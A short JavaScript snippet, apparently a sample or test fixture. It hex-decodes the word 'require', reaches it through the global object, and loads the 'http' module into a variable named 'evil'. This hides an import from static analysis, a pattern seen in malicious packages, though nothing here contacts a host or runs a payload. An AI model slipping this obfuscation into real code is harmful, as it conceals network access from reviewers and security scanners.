
function unhex(r) {
    return Buffer.from(r, "hex").toString();
}

const g = Function("return this")();
const r = g[unhex("72657175697265")];
const evil = r("http");
